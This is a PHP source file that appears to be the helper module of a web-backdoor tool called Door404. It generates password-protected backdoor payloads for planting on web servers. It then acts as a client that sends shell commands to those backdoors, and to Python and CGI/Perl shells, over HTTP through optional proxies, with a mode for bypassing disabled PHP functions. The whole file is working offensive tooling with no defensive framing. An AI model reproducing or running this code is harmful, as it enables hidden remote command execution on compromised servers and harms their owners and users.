<?php
function _version(){
$GitHub = "https://raw.githubusercontent.com/m4dm0e/Door404/master/Files/includes/version.txt";
$GitHub = @file_get_contents("$GitHub");
$VerFile = @file_get_contents("Files/includes/version.txt");
if($VerFile == $GitHub){
}else{
cEcho("  	    [ There is new version available now on GitHub ] \n","\e[97m");	
}
}
function ChEcK_PaSS($url,$pass,$proxy=NULL,$port=NULL){
again : $sh = curl_init();	
curl_setopt($sh, CURLOPT_URL,$url);
if($proxy != NULL && $port != NULL){
curl_setopt($sh, CURLOPT_PROXYPORT, $port);
curl_setopt($sh, CURLOPT_PROXY, $proxy);
}
curl_setopt($sh, CURLOPT_POST, true);   
curl_setopt($sh, CURLOPT_POSTFIELDS,"pass=$pass");	
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
if(preg_match("/INVAILD/",$postResult)){
echo cEcho("","\e[91m")."\n INVAILD PASSWORD :'( \n";
exit();
}
}
function simple_connect($url,$command,$passowrd,$proxy=NULL,$port=NULL){
$sh = curl_init();	
curl_setopt($sh, CURLOPT_URL,$url);
if($proxy != NULL && $port != NULL){
curl_setopt($sh, CURLOPT_PROXYPORT, $port);
curl_setopt($sh, CURLOPT_PROXY, $proxy);
}
curl_setopt($sh, CURLOPT_POST, true);   
curl_setopt($sh, CURLOPT_POSTFIELDS,"pass=$passowrd&crasher=$command");	
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
$postResult = str_replace("<pre>","",$postResult);
$postResult = str_replace("</pre>","",$postResult);
print "$postResult\n";
}

function secend_connect($url,$command,$path,$proxy=NULL,$port=NULL,$password){
$sh = curl_init();	
curl_setopt($sh, CURLOPT_URL,$url);
if($proxy != NULL && $port != NULL){
curl_setopt($sh, CURLOPT_PROXYPORT, $port);
curl_setopt($sh, CURLOPT_PROXY, $proxy);
}
curl_setopt($sh, CURLOPT_POST, true);   
curl_setopt($sh, CURLOPT_POSTFIELDS,"pass=$password&path=$path&crasher=$command");	
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
$postResult = str_replace("<pre>","",$postResult);
$postResult = str_replace("</pre>","",$postResult);
print "$postResult\n";
}

function advansed_connect($url,$command,$path,$proxy=NULL,$port=NULL,$password,$bYpass=false){
$sh = curl_init();	
curl_setopt($sh, CURLOPT_URL,$url);
if($proxy != NULL && $port != NULL){
curl_setopt($sh, CURLOPT_PROXYPORT, $port);
curl_setopt($sh, CURLOPT_PROXY, $proxy);
}
curl_setopt($sh, CURLOPT_POST, true);   
if($bYpass == false){
curl_setopt($sh, CURLOPT_POSTFIELDS,"pass=$password&path=$path&crasher=$command");	
}else{
curl_setopt($sh, CURLOPT_POSTFIELDS,"pass=$password&bYbass=true");	
}
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
$postResult = str_replace("<pre>","",$postResult);
$postResult = str_replace("</pre>","",$postResult);
if($bYpass == true){
return $postResult;
}else{
print "$postResult\n";
}
}

function python_shell($url,$command,$proxy=NULL,$port=NULL){
$sh = curl_init();	
curl_setopt($sh, CURLOPT_URL,$url);
if($proxy != NULL && $port != NULL){
curl_setopt($sh, CURLOPT_PROXYPORT, $port);
curl_setopt($sh, CURLOPT_PROXY, $proxy);
}
curl_setopt($sh, CURLOPT_POST, true);   
curl_setopt($sh, CURLOPT_POSTFIELDS,"cmd=$command");	
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
$postResult = str_replace("<pre>","",$postResult);
$postResult = str_replace("</pre>","",$postResult);
print "$postResult\n";
}

function cgi_perl_shell($url,$command,$proxy=NULL,$port=NULL){
$sh = curl_init();	
$command = urlencode($command);
curl_setopt($sh, CURLOPT_URL,$url."?cmd=$command");
if($proxy != NULL && $port != NULL){
curl_setopt($sh, CURLOPT_PROXYPORT, $port);
curl_setopt($sh, CURLOPT_PROXY, $proxy);
}
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
$postResult = str_replace("<pre>","",$postResult);
$postResult = str_replace("</pre>","",$postResult);
print "$postResult\n";
}

function sysclear(){
if(preg_match("/Linux/",php_uname())){
system("clear");	
}else{
system("cls");	
}	
}
function cEcho($in,$color){
$uName = @php_uname();
if(preg_match("/Linux/",$uName)){
echo $color.$in;
}else{
echo $in;
}
}
function Get_Vers($arg,$url,$proxy=NULL,$port=NULL){
$sh = curl_init();	
curl_setopt($sh, CURLOPT_URL,$url);
if($proxy != NULL && $port != NULL){
curl_setopt($sh, CURLOPT_PROXYPORT, $port);
curl_setopt($sh, CURLOPT_PROXY, $proxy);
}
curl_setopt($sh, CURLOPT_POST, true);   
curl_setopt($sh, CURLOPT_POSTFIELDS,"vers=GetVer");	
curl_setopt($sh, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($sh);
curl_close($sh);
if(preg_match("/SC/",$postResult)){
if(!preg_match("/-SC/",$arg)){
echo cEcho(" Hey you can't use [$arg] option with SC payload \n","\e[91m");	
exit();
}
}elseif(preg_match("/SCA/",$postResult)){
if(!preg_match("/-SCA/",$arg)){
echo cEcho(" Hey you can't use [$arg] option with the SCA payload \n","\e[91m");	
exit();
}
}elseif(preg_match("/JB/",$postResult)){
if(!preg_match("/-JB/",$arg)){
echo cEcho(" Hey you can't use [$arg] option with JB payload \n","\e[91m");	
exit();
}
}
}
function build($type,$path,$password){
$SIMPLE = @file_get_contents("Files/payloads/SC.php");
$SECEND = @file_get_contents("Files/payloads/SCA.php");
$ADVANSED = @file_get_contents("Files/payloads/JB.php");
if(preg_match("/SC/",$type)){
$SIMPLE = str_replace("DeFaUlT","$password",$SIMPLE);
$OP = fopen("$path","w+")or die("\n	ERR : UNKNOWN ERROR \n\n");
fwrite($OP,$SIMPLE);
fclose($OP);
}elseif(preg_match("/SCA/",$type)){
$SECEND = str_replace("DeFaUlT","$password",$SECEND);
$OP = fopen("$path","w+")or die("\n	ERR : UNKNOWN ERROR \n\n");
fwrite($OP,$SECEND);
fclose($OP);
}elseif(preg_match("/JB/",$type)){
$ADVANSED = str_replace("DeFaUlT","$password",$ADVANSED);
$OP = fopen("$path","w+")or die("\n	ERR : UNKNOWN ERROR \n\n");
fwrite($OP,$ADVANSED);
fclose($OP);
}
return 0;
}
function get_link(){	
echo " Enter script link : ";
$target = fgets(STDIN,1024);
$target = trim($target);
return $target;
}
function get_pass(){	
echo "\n payload password : ";
$password = fgets(STDIN,1024);
$password = trim($password);
return $password;
}
function help_map($pType){
if($pType == "SC"){
cEcho("\n  [~] There is nothing here \n","\e[97m");
}elseif($pType == "SCA"){
cEcho("\n  COMMANDS : \n","\e[97m");
cEcho("   chPath : change your current path\n","\e[97m");
}elseif($pType == "JB"){
cEcho("\n  COMMANDS : \n","\e[97m");
cEcho("   chPath : change your current path\n","\e[97m");
cEcho("   bypass : bypass disabled functions\n","\e[97m");

}
}
?>
